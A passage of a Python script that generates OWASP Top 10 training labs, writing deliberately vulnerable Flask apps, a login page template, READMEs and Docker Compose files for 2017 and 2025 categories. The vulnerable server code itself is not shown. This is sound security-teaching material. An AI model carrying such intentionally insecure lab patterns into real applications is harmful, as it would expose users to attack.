def generate_exception_app(config):
    """Generate exception handling app"""
    return generate_generic_app(config)

    print("\\nEDUCATIONAL PURPOSE ONLY")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
'''


def generate_home_html(config):
    """Generate home.html template"""
    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{config['title']} Lab</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 100%;
        }}
        
        h1 {{
            color: #333;
            margin-bottom: 10px;
        }}
        
        .badge {{
            display: inline-block;
            padding: 5px 15px;
            background: #ff6b6b;
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 20px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        label {{
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 500;
        }}
        
        input[type="text"],
        input[type="password"] {{
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }}
        
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        
        button {{
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        
        button:hover {{
            transform: translateY(-2px);
        }}
        
        .warning {{
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 14px;
        }}
        
        .success {{
            background: #d4edda;
            border: 1px solid #28a745;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{config['title']}</h1>
        <div class="badge">VULNERABLE LAB</div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit">Login</button>
        </form>
        
        <div class="warning">
            <strong>⚠️ Educational Lab</strong><br>
            This is a deliberately vulnerable application for learning purposes.
            Do not use any code from this lab in production!
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            fetch('/login', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                body: new URLSearchParams(new FormData(e.target))
            }})
            .then(r => r.json())
            .then(data => {{
                if (data.success) {{
                    alert('Login successful! Role: ' + data.role);
                    location.reload();
                }} else {{
                    alert('Login failed: ' + data.message);
                }}
            }});
        }});
    </script>
</body>
</html>'''


def generate_readme(config):
    """Generate README.md for lab"""
    return f'''# {config['title']} Lab

## Overview

This lab demonstrates {config['title']} vulnerabilities in a safe, isolated environment.

## Setup

### Using Docker Compose (Recommended)

```bash
docker-compose up --build
```

The application will be available at `http://localhost:{config['port']}`

### Manual Setup

```bash
cd app
pip install -r requirements.txt
python server.py
```

## Lab Objectives

1. Understand how {config['title']} vulnerabilities work
2. Identify the vulnerable code patterns
3. Exploit the vulnerability safely
4. Learn how to prevent these issues

## Important Notice

⚠️ **EDUCATIONAL PURPOSE ONLY**

This application is intentionally vulnerable. Never use this code or patterns in production applications.

## Documentation

For detailed information, see:
- [Overview](../overview.md)
- [Attack Vectors](../attack-vectors.md)
- [Prevention](../prevention.md)
- [Code Examples](../examples.md)

## Port

This lab runs on port **{config['port']}**
'''


def create_lab(lab_config):
    """Create a complete lab with all files"""
    print(f"\\n{'='*70}")
    print(f"Creating Lab: {lab_config['title']}")
    print(f"{'='*70}")
    
    # Create directory structure
    base_dir = f"OWASP-Web/{lab_config['number']}-{lab_config['name']}"
    lab_dir = f"{base_dir}/lab/{lab_config['slug']}"
    app_dir = f"{lab_dir}/app"
    templates_dir = f"{app_dir}/templates"
    
    create_directory(base_dir)
    create_directory(lab_dir)
    create_directory(app_dir)
    create_directory(templates_dir)
    
    # Generate documentation files
    print("\\nGenerating documentation...")
    for doc_type in ['overview', 'prevention', 'attack-vectors', 'examples']:
        md_file = f"{base_dir}/{doc_type}.md"
        html_file = f"{base_dir}/{doc_type}.html"
        
        content = lab_config[doc_type.replace('-', '_')]
        write_file(md_file, content)
        
        # Convert to HTML
        title = f"{lab_config['title']} - {doc_type.replace('-', ' ').title()}"
        html_content = markdown_to_html(content, title)
        write_file(html_file, html_content)
    
    # Generate lab files
    print("\\nGenerating lab environment...")
    
    # server.py
    flask_app = generate_flask_app(lab_config)
    write_file(f"{app_dir}/server.py", flask_app)
    
    # requirements.txt
    write_file(f"{app_dir}/requirements.txt", "Flask==3.0.0\nWerkzeug==3.0.1\n")
    
    # templates/home.html
    home_html = generate_home_html(lab_config)
    write_file(f"{templates_dir}/home.html", home_html)
    
    # docker-compose.yml
    docker_compose = f'''version: '3.8'

services:
  web:
    build:
      context: ./app
      dockerfile: ../../../../../labs/base/Dockerfile
    ports:
      - "{lab_config['port']}:5000"
    environment:
      - FLASK_ENV=development
      - FLASK_DEBUG=0
    volumes:
      - ./app:/app
    networks:
      - lab-network

networks:
  lab-network:
    driver: bridge
'''
    write_file(f"{lab_dir}/docker-compose.yml", docker_compose)
    
    # README.md
    readme = generate_readme(lab_config)
    write_file(f"{lab_dir}/README.md", readme)
    
    print(f"\\n✅ Lab created successfully: {base_dir}")
    print(f"   Port: {lab_config['port']}")


# ============================================================================
# Main Execution
# ============================================================================

def main():
    print("=" * 70)
    print("OWASP Top 10 - Missing Labs Generator")
    print("=" * 70)
    print("\\nThis script will generate:")
    print("  • 6 Web 2017 Labs")
    print("  • 4 Web 2025 Labs")
    print("  • Complete documentation for each")
    print("  • Docker-based lab environments")
    print("=" * 70)
    
    # Generate Web 2017 Labs
    print("\\n\\n📚 GENERATING WEB 2017 LABS")
    print("=" * 70)
    
    labs_2017 = [
        generate_broken_authentication_2017(),
        generate_sensitive_data_exposure_2017(),
        generate_xxe_2017(),
        generate_xss_2017(),
        generate_insecure_deserialization_2017(),
        generate_insufficient_logging_2017()
    ]
    
    for lab in labs_2017:
        create_lab(lab)
    
    # Generate Web 2025 Labs
    print("\\n\\n🚀 GENERATING WEB 2025 LABS")
    print("=" * 70)
    
    labs_2025 = [
        generate_supply_chain_2025(),
        generate_authentication_failures_2025(),
        generate_logging_alerting_failures_2025(),
        generate_mishandling_exceptions_2025()
    ]
    
    for lab in labs_2025:
        create_lab(lab)
    
    # Summary
    print("\\n\\n" + "=" * 70)
    print("✅ ALL LABS GENERATED SUCCESSFULLY!")
    print("=" * 70)
    print("\\nSummary:")
    print(f"  • Web 2017 Labs: {len(labs_2017)} created")
    print(f"  • Web 2025 Labs: {len(labs_2025)} created")
    print(f"  • Total Labs: {len(labs_2017) + len(labs_2025)}")
    print("\\nEach lab includes:")
    print("  ✓ 4 documentation files (.md and .html)")
    print("  ✓ Vulnerable Flask application")
    print("  ✓ Docker Compose configuration")
    print("  ✓ README with instructions")
    print("\\nTo run a lab:")
    print("  cd OWASP-Web/<number>-<name>/lab/<slug>")
    print("  docker-compose up --build")
    print("=" * 70)


if __name__ == '__main__':
    main()
